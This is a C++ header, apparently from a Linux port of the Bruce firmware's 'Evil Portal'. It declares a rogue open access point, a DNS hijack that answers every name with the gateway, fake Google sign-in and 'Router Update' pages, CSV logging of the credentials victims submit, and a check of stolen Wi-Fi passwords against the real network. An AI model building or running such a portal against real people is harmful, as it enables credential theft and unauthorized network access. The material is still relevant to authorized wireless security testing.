/*
 * SPDX-FileCopyrightText: 2026 Bruce CardputerZero Community
 *
 * SPDX-License-Identifier: AGPL-3.0-only
 *
 * Evil Portal - Linux port of the ESP32 Bruce firmware feature (pr3y/Bruce,
 * src/modules/wifi/evil_portal.cpp). Same behavior: an open AP with a chosen
 * SSID, every DNS answer pointing at the AP, an HTTP captive portal serving
 * the Bruce pages, submitted credentials captured to
 * ~/.bruce/BruceEvilCreds/<file>.csv exactly like the ESP32 writes
 * /BruceEvilCreds/<file>.csv, plus the /creds (view), /ssid and /postssid
 * (live SSID change) routes and the "Router Update" page that verifies the
 * stolen password against the real network before logging valid: true/false.
 *
 * On Linux the AP comes from hostapd and DNS+DHCP from dnsmasq (the ESP32
 * equivalents are WiFi.softAP and DNSServer), so those binaries must exist
 * and the app must run as root - same requirement as the rest of the
 * Wi-Fi tooling.
 */

#pragma once

#include <functional>
#include <string>
#include <utility>
#include <vector>

namespace platform {

// --- request/response model (shared by the live server and the self-check) ---

struct HttpRequest {
    std::string method; // "GET" / "POST"
    std::string path;   // "/post", "/creds", ... (no query string)
    // Form arguments, query string first then urlencoded POST body, in order.
    std::vector<std::pair<std::string, std::string>> args;
};

struct HttpResponse {
    int status = 200;
    std::string body;
};

// Everything the portal needs to run. `html_page` is what "/"/unknown paths
// serve (Bruce's htmlPage): the default Google page, the Router Update page
// or a custom HTML file. `output_file` is the CSV name inside creds_dir for
// plain captures; verify mode writes <ap_name>_creds.csv instead (Bruce's
// saveToCSV(..., isAPname=true) in the verify path).
struct PortalOptions {
    std::string ap_name = "Free Wifi"; // Bruce's keyboard default
    std::string gateway = "192.168.4.1";
    int channel = 1;
    std::string html_page;
    std::string output_file = "default_creds.csv";
    bool verify_mode = false;
    std::string creds_dir; // $HOME/.bruce/BruceEvilCreds (set by evil_portal_main)
};

// Live counters shown in the run log (Bruce's screen shows the same numbers).
struct PortalState {
    int victims = 0;
    std::string captured_html; // accumulated "<li>key: value<br>...</li>\n" entries
    std::string last_cred;     // human-readable "ema: ..., pas: ..." of the last capture
};

// Live-mode hooks. The self-check injects fakes; evil_portal_main injects the
// hostapd/dnsmasq/wpa_supplicant implementations.
struct PortalHooks {
    // Restart the AP with opts.ap_name (the /postssid route; Bruce restarts
    // the softAP under the new name). May be null (no-op) in tests.
    std::function<void(const PortalOptions&)> on_ap_restart;
    // Try to connect to ap_name using the submitted password; true = valid.
    // Bruce: WiFi.begin() + 8 x 500ms wait. May be null -> treated as failed
    // verification but still captured.
    std::function<bool(const PortalOptions&, const std::string& password)> verify_password;
};

// --- pure helpers (unit-checked in tests/evil_portal_selfcheck.cpp) ---------

// Percent-decoding of a urlencoded token ('+' becomes space).
std::string url_decode(const std::string& s);

// Bruce's credsController skips these keys when recording credentials
// (tracking/noise parameters from real-world captive portals).
bool is_noise_key(const std::string& key);

// "a=1&b=two" (or a POST body) -> ordered key/value pairs.
std::vector<std::pair<std::string, std::string>> parse_form_args(const std::string& encoded);

// The CSV row Bruce writes: "key: value, key2: value2" over the filtered args.
std::string csv_line(const std::vector<std::pair<std::string, std::string>>& args);

// The <li> entry prepended to the /creds list: "key: value<br>\n" per arg.
std::string captured_li(const std::vector<std::pair<std::string, std::string>>& args);

// The on-log view of one capture (Bruce's lastCred): first 3 chars of each key.
std::string last_cred_text(const std::vector<std::pair<std::string, std::string>>& args);

// First line "<!-- AP=\"MyName\" -->" of a custom HTML file -> "MyName"
// (Bruce's loadCustomHtml). Empty when absent.
std::string parse_ap_tag(const std::string& html);

// Parse one raw HTTP request head (+ optional body). Query-string args are
// merged into args after body args; Content-Length bounds the body read.
HttpRequest parse_http_request(const std::string& raw);

// --- Bruce's pages (copied verbatim from the ESP32 firmware) ---------------

const char* default_portal_html(); // "Sign in: Google Accounts" (default_creds.csv)
const char* verify_portal_html();  // "Router Update" password-verify page
const char* wifi_load_html();      // animated Wi-Fi logo shown after a capture

// Bruce's getHtmlTemplate(): portal-styled wrapper with the AP name as title.
std::string portal_template(const std::string& ap_name, const std::string& body);
std::string creds_page(const std::string& ap_name, const std::string& captured_html);
std::string ssid_page(const std::string& ap_name);
std::string ssid_post_page(const std::string& ap_name);

// --- config generators (hostapd/dnsmasq/wpa_supplicant) ---------------------

// Open-AP config for hostapd (driver line required, or hostapd refuses to
// start - the bug the old "Rogue open AP" menu entry had).
std::string hostapd_conf(const std::string& iface, const std::string& ssid, int channel);
// DHCP + DNS hijack: every name resolves to the gateway, clients get it as
// router and DNS server - the Linux stand-in for DNSServer.start(53, "*", ip).
std::string dnsmasq_conf(const std::string& iface, const std::string& gateway);
// One-network wpa_supplicant config for password verification.
std::string wpa_conf(const std::string& ssid, const std::string& password);

// --- request routing ---------------------------------------------------------

// One request through Bruce's route table (/, /post, /creds, /ssid,
// /postssid, onNotFound). Returns the response to send; mutates state,
// appends CSV files and fires hooks exactly like the ESP32 handlers.
HttpResponse portal_handle_request(const HttpRequest& req, PortalOptions& opts,
                                  PortalState& state, const PortalHooks& hooks);

// --- entry point -------------------------------------------------------------

// `--evil-portal <mode> [args...]`
//   default [ssid]          Google page AP (Bruce "Default")
//   verify  [ssid]          Router-Update page + password check ("Default (one)")
//   custom  <file> [ssid]   HTML from file, <!-- AP="..." --> sets the name
//   clone   <ssid> [chan]   clone a scanned AP ("Clone Portal")
// Long-running: streams the portal log until SIGTERM/SIGINT.
int evil_portal_main(int argc, char** argv);

} // namespace platform
